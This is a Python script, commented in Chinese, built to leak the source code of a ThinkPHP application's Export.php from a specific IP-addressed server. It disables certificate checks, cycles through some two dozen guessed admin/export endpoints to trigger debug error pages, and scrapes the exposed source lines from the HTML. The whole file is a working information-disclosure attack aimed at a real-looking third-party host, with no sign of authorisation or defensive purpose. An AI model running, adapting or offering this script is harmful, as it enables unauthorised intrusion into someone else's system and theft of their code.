#!/usr/bin/env python3
"""tp_export_full.py - 穷尽泄露Export.php全部源码(222行之后)
方法: 让goodslist执行到更深处, 或找Export其他方法触发不同窗口
"""
import urllib.request, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'https://139.196.199.221'

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(300000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read(300000).decode('utf-8', 'ignore')
    except Exception:
        return 0, ''

def leak_lines(b):
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        lines[int(m.group(1))] = re.sub(r'<[^>]+>', '', m.group(2))
    return lines

def file_of(b):
    files = []
    for m in re.finditer(r'<a class="toggle" title="([^"]+)"', b):
        f = m.group(1)
        if 'Export.php' in f and f not in files:
            files.append(f)
    return files

all_lines = {}
print("=== 触发Export.php各方法 ===", flush=True)
# 所有Export可能的方法
for m in ['goodslist', 'index', 'list', 'export', 'order', 'user', 'product', 'all',
          'data', 'excel', 'csv', 'xls', 'download', 'goods', 'orders', 'users',
          'products', 'member', 'members', 'finance', 'log', 'brand', 'type']:
    st, b = get(BASE + '/admin/export/%s.html?num=5&page=1' % m)
    l = leak_lines(b)
    files = file_of(b)
    new = {k: v for k, v in l.items() if k not in all_lines}
    if new:
        print('%s: +%d lines files=%s' % (m, len(new), [f.split('/')[-1][:30] for f in files]), flush=True)
        all_lines.update(new)
    m2 = re.search(r'<h1>([^<]{0,70})</h1>', b)
    if m2 and 'variable type' not in m2.group(1):
        print('  err: %s' % m2.group(1), flush=True)

print()
print("=== Export.php 全部泄露行 ===")
for ln in sorted(all_lines):
    print('  %4d: %s' % (ln, all_lines[ln][:140]), flush=True)
print('=== DONE ===')
